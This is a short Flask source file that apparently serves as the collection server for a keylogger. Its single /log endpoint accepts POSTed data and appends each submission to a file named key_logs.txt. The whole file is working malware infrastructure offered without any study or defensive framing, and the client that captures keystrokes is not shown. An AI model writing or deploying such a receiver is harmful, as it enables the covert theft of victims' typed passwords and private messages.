from flask import Flask, render_template, request
from werkzeug import secure_filename
app = Flask(__name__)
	
@app.route('/log', methods = ['POST'])
def upload_file():
   if request.method == 'POST':
      with open("key_logs.txt", "a") as f:
         f.write(request.data.decode())
         f.write("\n" + "="*50 + "\n")
      return 'ok', 200
		
if __name__ == '__main__':
   app.run()
